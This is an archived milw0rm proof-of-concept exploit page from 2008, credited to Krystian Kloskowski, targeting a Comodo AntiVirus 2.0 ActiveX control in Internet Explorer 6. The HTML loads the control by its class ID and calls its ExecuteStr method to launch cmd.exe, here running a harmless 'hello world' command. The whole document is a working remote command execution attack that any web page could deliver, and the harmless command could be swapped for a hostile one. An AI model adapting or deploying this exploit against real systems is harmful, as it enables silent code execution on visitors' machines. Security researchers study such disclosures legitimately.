<!--
Comodo AntiVirus 2.0 ExecuteStr() 0day Remote Command Execution Exploit
Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
Tested on:..
- Comodo AntiVirus Beta 2.0
- Microsoft Internet Explorer 6
Just for fun  ;)  
-->

<html>
<object id="obj" classid="clsid:309F674D-E4D3-46BD-B9E2-ED7DFD7FD176"></object>

<script>
obj.ExecuteStr('cmd.exe', '/C echo "hello world" && pause');
</script>

</html>

# milw0rm.com [2008-01-23]
